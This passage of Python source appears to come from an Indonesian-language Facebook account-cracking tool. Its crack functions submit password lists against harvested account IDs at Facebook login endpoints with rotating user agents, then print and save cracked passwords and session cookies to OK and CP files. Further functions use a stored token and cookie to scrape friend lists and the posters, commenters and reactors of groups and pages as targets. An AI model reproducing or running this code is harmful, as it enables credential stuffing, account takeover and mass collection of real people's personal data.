f"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1736472639792%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4d9b57a435e11ba5%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dpopup%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26locale%3Den_US%26logger_id%3Dff5c4fef7e3d5cc40%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbfa713d78e1cd783%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%2526frame%253Df43043cb59adc9703%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfbfa713d78e1cd783%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Fff71f33a48b104696%26relation%3Dopener%26frame%3Df43043cb59adc9703%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
            }
            po = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1736472639792%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4d9b57a435e11ba5%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dpopup%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26locale%3Den_US%26logger_id%3Dff5c4fef7e3d5cc40%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbfa713d78e1cd783%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fff71f33a48b104696%2526relation%253Dopener%2526frame%253Df43043cb59adc9703%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&popup=1&lwv=100", data=data, headers=headers, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print("// data json checkpoint")
                print("{")
                prints(f"\tid : [bold yellow]{idf}")
                prints(f"\tpassword : [bold yellow]{pw}")
                prints(f"\tuser agent : [bold yellow]{ua}")
                print("}")
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys() or 'href="https://web.facebook.com/?_rdc=1&_rdr"' in str(po):
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
                print("// data json success")
                print("{")
                prints(f"\tid : [bold green]{idf}")
                prints(f"\tpassword : [bold green]{pw}")
                prints(f"\tuser agent : [bold green]{ua}")
                prints(f"\tcookies : [bold green]{kuki}")
                print("}")
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + '\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(3)
    loop -= 1
def crack2(idf, pwv):
    global loop, ok, cp
    rr = random.randint
    rc = random.choice
    ses = requests.Session()
    prog.update(des, description=f'{(loop)} ok : {(ok)} cp : {(cp)}')
    prog.advance(des)
    for pw in pwv:
        try:
            p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1036341366506456&kid_directed_site=0&app_id=1036341366506456&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D1036341366506456%26redirect_uri%3Dhttps%253A%252F%252Fwww.pubgmobile.com%252Fact%252Fyoutubeconnect%252Findex.html%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0ae025db-ebc3-4757-b88f-33dfa3c9a19b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.pubgmobile.com%2Fact%2Fyoutubeconnect%2Findex.html%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=page&locale=en_GB&pl_dbl=0')
            ua = random.choice(ugen)
            dataa = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),
                "li":re.search('name="li" value="(.*?)"',str(p.text)).group(1),
                "try_number":re.search('name="try_number" value="(.*?)"',str(p.text)).group(1),
                "unrecognized_tries":re.search('name="unrecognized_tries" value="(.*?)"',str(p.text)).group(1),
                "email":idf,
                "pass":pw,
                "prefill_contact_point":"",
                "prefill_source":"",
                "prefill_type":"",
                "first_prefill_source":"",
                "first_prefill_type":"",
                "had_cp_prefilled":"false",
                "had_password_prefilled":"false"
            }
            heade = {
                'Host': 'm.facebook.com',
                'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language':'en-US,en;q=0.9',
                'cache-control':'max-age=0',
                'dpr': '2',
                'priority':'u=0, i',
                'sec-ch-prefers-color-scheme':'dark',
                'sec-ch-ua':'"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform':'"macOS"',
                'sec-ch-ua-platform-version':'"14.6.1"',
                'sec-fetch-dest':'document',
                'sec-fetch-mode':'navigate',
                'sec-fetch-site':'none',
                'sec-fetch-user':'?1',
                'upgrade-insecure-requests':'1',
                "referer": f"https://m.facebook.com/login.php?skip_api_login=1&api_key=1036341366506456&kid_directed_site=0&app_id=1036341366506456&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D1036341366506456%26redirect_uri%3Dhttps%253A%252F%252Fwww.pubgmobile.com%252Fact%252Fyoutubeconnect%252Findex.html%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0ae025db-ebc3-4757-b88f-33dfa3c9a19b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.pubgmobile.com%2Fact%2Fyoutubeconnect%2Findex.html%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=page&locale=en_GB&pl_dbl=0",
                'user-agent':ua,
                'viewport-width':'654'
            }
            po = ses.post('https://m.facebook.com/login/device-based/regular/login/?api_key=1036341366506456&auth_token=c64faeaece07fece7d516c2d7c7dd63e&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D1036341366506456%26redirect_uri%3Dhttps%253A%252F%252Fwww.pubgmobile.com%252Fact%252Fyoutubeconnect%252Findex.html%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D73e8ebc7-ac39-435a-b76d-40504b6623e2%26tp%3Dunspecified&refsrc=deprecated&app_id=1036341366506456&cancel=https%3A%2F%2Fwww.pubgmobile.com%2Fact%2Fyoutubeconnect%2Findex.html%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100&locale2=en_GB&refid=9',data=dataa,headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                Alya = Tree(Panel.fit(f"Login checkpoint", style="yellow"))
                Alya.add(Panel.fit(f"{idf} | {pw}", style="yellow")).add(Panel.fit(f"{ua}", style="yellow"))
                prints(Alya)
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
                Alya = Tree(Panel.fit(f"Login Successfully", style="green"))
                Alya.add(Panel.fit(f"{idf} | {pw}", style="green"))
                Alya.add(Panel.fit(f"{kuki}", style="green"))
                prints(Alya)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + '\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(3)
    loop -= 1
    

def convert(cookie):
    cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
    return(str(cok))

def CreatePage(name:str, category:list, token:str):
    r    = requests.Session()
    vir  = {"params":{"client_input_params":{"cp_upsell_declined":0,"category_ids":category,"profile_plus_id":"0","page_id":"0"},"server_params":{"name":name,"INTERNAL__latency_qpl_instance_id":random.randrange(36700000,36800000),"creation_source":"android","screen":"category","referrer":"pages_tab_launch_point","INTERNAL__latency_qpl_marker_id":float(str('{:.13f}'.format(random.random()+3))+'E13'),"variant":5}}}
    var  = {"params":{"params":json.dumps(vir),"bloks_versioning_id":'c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec',"app_id":"com.bloks.www.additional.profile.plus.creation.action.category.submit"},"scale":"1","nt_context":{"styles_id":'e6c6f61b7a86cdf3fa2eaaffa982fbd1',"using_white_navbar":True,"pixel_ratio":1,"is_push_on":True,"bloks_version":'c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec'}}
    data = {'access_token':token,'method':'post','pretty':False,'format':'json','server_timestamps':True,'locale':'id_ID','purpose':'fetch','fb_api_req_friendly_name':'FbBloksActionRootQuery-com.bloks.www.additional.profile.plus.creation.action.category.submit','fb_api_caller_class':'graphservice','client_doc_id':'11994080423068421059028841356','variables':json.dumps(var),'fb_api_analytics_tags':["GraphServices"],'client_trace_id':str(uuid.uuid4())}
    pos  = r.post('https://graph.facebook.com/graphql', data=data).text.replace('\\','')
    if ('profile_plus_id' in str(pos)) and ('page_id' in str(pos)):
        name, page_id, profile_id = re.findall(r'"android", "pages_tab_launch_point", "(.*?)", "(.*?)", "(.*?)", "intent_selection"', str(pos))[0]
        print('Success Create Page!')
        print('Page Name  :', name)
        print('Page ID    :', page_id)
        print('Profile ID :', profile_id)
    else:
        print('Failed Create Page!')

def Dump_graph():
    loop = 0
    id_list = []  # Mendeklarasikan variabel id_list
    try:
        token = open('.token.txt', 'r').read()
        kukis = open('.cookie.txt', 'r').read()
    except IOError:
        exit()

    pil = input('[ > ] masukan id (pisahkan dengan koma): ')
    ids = pil.split(',')  # Memisahkan ID yang dimasukkan berdasarkan koma
    for id_input in ids:
        try:
            params = {
                "access_token": token,
                "fields": "friends.limit(99999)"  # Membatasi jumlah teman yang diambil
            }
            response = requests.get(
                f'https://graph.facebook.com/v12.0/{id_input.strip()}',  # Perbarui ke v12.0
                params=params,
                cookies={'cookie': kukis}
            ).json()
            if 'friends' in response and 'data' in response['friends']:
                for pi in response['friends']['data']:
                    try:
                        id_list.append(pi['id'] + '|' + pi['name'])  
                        print(f'{pi["id"]}|{pi["name"]}')
                        with open('dump.txt', 'a') as file:
                            file.write(f'\n{pi["id"]}|{pi["name"]}')
                        loop += 1
                    except Exception as e:
                        print(f"Error processing friend data: {e}")
            else:
                print("No friends data found.")

            if 'friends' in response and 'summary' in response['friends']:
                total_friends = response['friends']['summary']['total_count']
                print(f"Total friends for {id_input.strip()}: {total_friends}")

        except Exception as e:
            print(f"Error with ID {id_input.strip()}: {e}")
    
import os, sys, random, json, re, concurrent
from concurrent.futures import ThreadPoolExecutor

def mod():
    global requests, bs4, bs
    try: import requests
    except Exception as e: os.system('pip install requests'); import requests
    try: import bs4
    except Exception as e: os.system('pip install bs4'); import bs4
    from bs4 import BeautifulSoup as bs

class TimelineNoLogin():
    def __init__(self,cookie=''):
        self.xyz = requests.Session()
        self.dump = 0
        self.result = []
        self.cookie = cookie
        self.ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
        self.head = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Cache-Control':'max-age=0','Dpr':'1.125','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':self.ua,'Viewport-Width':'924'}
        self.LandingTimeline()

    #--> Dump From Facebook Group
    def LandingTimeline(self):
        prints(Panel(f'[bold white]1. Grup\n2. Page',style='blue'))
        x = input('Pilih : ')
        print('')
        if   x in ['1','01','a']:
            typ = 'Grup'
            idt = input('Masukkan ID Grup : ')
            url = f'https://www.facebook.com/groups/{idt}' #--> 175107520598383
        elif x in ['2','02','b']:
            typ = 'Page'
            idt = input('Masukkan ID Page : ')
            url = f'https://www.facebook.com/{idt}' #--> 100069058853738
        else:
            print('Isi Yang Benar!')
            exit()
        self.data_post, self.data_scrap = self.ScrapData(url,typ)
        print('Nama %s : %s'%(typ,self.data_scrap['name']))
        self.lim = int(input('Berapa ID : '))
        print('')
        self.ScrapOverall(type=typ)

    #--> Scrap Data
    def ScrapData(self,url,type):
        try:
            req = bs(self.xyz.get(url,headers=self.head,cookies={'cookie':self.cookie},allow_redirects=True).content,'html.parser')
            data_post = {'av':re.search('__user=(.*?)&',str(req)).group(1),'__user':re.search('__user=(.*?)&',str(req)).group(1),'__a':re.search('__a=(.*?)&',str(req)).group(1),'__req':random.choice(['a','1','2','3','4','5']),'__hs':re.search('"haste_session":"(.*?)"',str(req)).group(1),'dpr':re.search('"pr":(.*?),',str(req)).group(1),'__ccg':random.choice(['EXCELLENT','GOOD']),'__rev':re.search('{"rev":(.*?)}',str(req)).group(1),'__hsi':re.search('"hsi":"(.*?)"',str(req)).group(1),'__comet_req':re.search('__comet_req=(.*?)&',str(req)).group(1),'lsd':re.search('"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1),'jazoest':re.search('&jazoest=(.*?)"',str(req)).group(1),'__spin_r':re.search('"__spin_r":(.*?),',str(req)).group(1),'__spin_b':re.search('"__spin_b":"(.*?)"',str(req)).group(1),'__spin_t':re.search('"__spin_t":(.*?),',str(req)).group(1),'fb_api_caller_class':'RelayModern','server_timestamps':True}
            if type == 'Grup':
                data_scrap = {'id':re.search('"groupID":"(.*?)"',str(req)).group(1),'name':re.search('"meta":{"title":"(.*?)"',str(req)).group(1),'username':re.search('"idorvanity":"(.*?)"',str(req)).group(1),'f_location':re.search('"feedLocation":"(.*?)"',str(req)).group(1),'f_type':re.search('"feedType":"(.*?)"',str(req)).group(1)}
            elif type == 'Page':
                data_scrap = {'id':re.search('"userID":"(.*?)"',str(req)).group(1),'name':re.search('"meta":{"title":"(.*?)"',str(req)).group(1)}
            return(data_post,data_scrap)
        except Exception as e:
            print('ID Not Found or Something Went Wrong')
            exit()

    #--> Get Overall Info
    def ScrapOverall(self,type,cursor=None):
        if type == 'Grup':
            dtp, dtg = self.data_post.copy(), self.data_scrap.copy()
            var = {"UFI2CommentsProvider_commentsKey":"CometGroupDiscussionRootSuccessQuery","count":3,"cursor":cursor,"id":dtg['id'],"feedLocation":dtg['f_location'],"feedType":dtg['f_type'],"renderLocation":"group","stream_initial_count":1,"feedbackSource":0,"focusCommentID":None,"scale":1.5,"sortingSetting":None,"useDefaultActor":False,"privacySelectorRenderLocation":"COMET_STREAM","__relay_internal__pv__IsWorkUserrelayprovider":False,"__relay_internal__pv__IsMergQAPollsrelayprovider":False,"__relay_internal__pv__CometUFIIsRTAEnabledrelayprovider":False,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":False,"__relay_internal__pv__StoriesRingrelayprovider":False,"displayCommentsContextEnableComment":None,"displayCommentsContextIsAdPreview":None,"displayCommentsContextIsAggregatedShare":None,"displayCommentsContextIsStorySet":None,"displayCommentsFeedbackContext":None,}
            dtp.update({'fb_api_req_friendly_name':'GroupsCometFeedRegularStoriesPaginationQuery','variables':json.dumps(var),'doc_id':'6617440634998224'})
        elif type == 'Page':
            dtp, dtg = self.data_post.copy(), self.data_scrap.copy()
            var = {"UFI2CommentsProvider_commentsKey":"ProfileCometTimelineRoute","afterTime":None,"beforeTime":None,"count":3,"cursor":cursor,"displayCommentsContextEnableComment":None,"displayCommentsContextIsAdPreview":None,"displayCommentsContextIsAggregatedShare":None,"displayCommentsContextIsStorySet":None,"displayCommentsFeedbackContext":None,"feedLocation":"TIMELINE","feedbackSource":0,"focusCommentID":None,"memorializedSplitTimeFilter":None,"omitPinnedPost":True,"postedBy":None,"privacy":None,"privacySelectorRenderLocation":"COMET_STREAM","renderLocation":"timeline","scale":1.5,"stream_count":1,"taggedInOnly":None,"useDefaultActor":False,"id":dtg['id'],"__relay_internal__pv__IsWorkUserrelayprovider":False,"__relay_internal__pv__IsMergQAPollsrelayprovider":False,"__relay_internal__pv__CometUFIReactionsEnableShortNamerelayprovider":False,"__relay_internal__pv__CometUFIIsRTAEnabledrelayprovider":False,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":False,"__relay_internal__pv__StoriesRingrelayprovider":False}
            dtp.update({'fb_api_req_friendly_name':'ProfileCometTimelineFeedRefetchQuery','variables':json.dumps(var),'doc_id':'5689925947799218'})
        try:
            pos = self.xyz.post('https://www.facebook.com/api/graphql/',data=dtp,cookies={'cookie':self.cookie}).text
            feedback = list(set(re.findall('"feedback":{"id":"(.*?)"',str(pos))))

            with ThreadPoolExecutor(max_workers=30) as TPE:
                for x in list(set(re.findall(r'"__typename":"User","name":"(.*?)","id":"(.*?)"',str(pos)))):
                    if self.dump >= self.lim: break
                    else:
                        if 'short_name' in str(x): pass
                        else: TPE.submit(self.ScrapPost,list(x))
            #--> Submit To Comment
            with ThreadPoolExecutor(max_workers=30) as TPE:
                for fbid in feedback:
                    if self.dump >= self.lim: break
                    else: TPE.submit(self.ScrapComment,fbid)
            #--> Submit To React
            with ThreadPoolExecutor(max_workers=30) as TPE:
                for fbid in feedback:
                    if self.dump >= self.lim: break
                    else: TPE.submit(self.ScrapReact,fbid)
            if self.dump >= self.lim: pass
            else:
                try: self.ScrapOverall(type,re.search('"end_cursor":"(.*?)"',str(pos)).group(1))
                except Exception as e: pass
        except Exception as e: pass
    #--> Get ID From Who Posted In Group
    def ScrapPost(self,dat):
        try:
            ray = {'id':self.ConvertID(dat[-1]),'name':dat[0]}
            if 'pfbid' in ray['id']: pass
            else:
                if ray in self.result: pass
                else:
                    self.result.append(ray)
                    print('%s|%s'%(ray['id'],ray['name']))
                    open('dump.txt','a+').write('%s|%s\n'%(ray['id'],ray['name']))
                    self.dump += 1
        except Exception as e: pass
    def ScrapComment(self,fbid):
        try:
            dtp = self.data_post.copy()
            dtp.update({'fb_api_req_friendly_name':'CometUFICommentsCountTooltipContentQuery','variables':json.dumps({"feedbackTargetID":fbid}),'doc_id':'6381324631954417'})
            pos = self.xyz.post('https://www.facebook.com/api/graphql/',data=dtp,cookies={'cookie':self.cookie}).json()
            for p in pos['data']['feedback']['commenters']['edges']:
                try:
                    ray = {'id':self.ConvertID(p['node']['id']),'name':p['node']['name']}
                    if 'pfbid' in ray['id']: pass
                    else:
                        if ray in self.result: pass
                        else:
                            self.result.append(ray)
                            print('%s|%s'%(ray['id'],ray['name']))
                            open('dump.txt','a+').write('%s|%s\n'%(ray['id'],ray['name']))
                            self.dump += 1
                except Exception as e: pass
        except Exception as e: pass
    #--> Get ID From Who Reacted On Each Post In Group
    def ScrapReact(self,fbid):
        for react in ["1635855486666999","1678524932434102","115940658764963","478547315650144","908563459236466","444813342392137","613557422527858"]:
            try:
                dtp = self.data_post.copy()
                dtp.update({'fb_api_req_friendly_name':'CometUFIReactionIconTooltipContentQuery','variables':json.dumps({"feedbackTargetID":fbid,"reactionID":react}),'doc_id':'6235145276554312'})
                pos = self.xyz.post('https://www.facebook.com/api/graphql/',data=dtp,cookies={'cookie':self.cookie}).json()
                for p in pos['data']['feedback']['reactors']['nodes']:
                    try:
                        ray = {'id':self.ConvertID(p['id']),'name':p['name']}
                        if 'pfbid' in ray['id']: pass
                        else:
                            if ray in self.result: pass
                            else:
                                self.result.append(ray)
                                print('%s|%s'%(ray['id'],ray['name']))
                                open('dump.txt','a+').write('%s|%s\n'%(ray['id'],ray['name']))
                                self.dump += 1
                    except Exception as e: pass
            except Exception as e: pass
    #--> Convert PFBID To ID
    def ConvertID(self,id):
        try:
            r = requests.Session()
            q = r.get(f'https://web.facebook.com/{id}',headers=self.head,allow_redirects=True).text
            return(re.search('"userID":"(.*?)"',str(q)).group(1))
        except Exception as e: return(id)

        
if __name__ == '__main__':
    mod()
    menu()
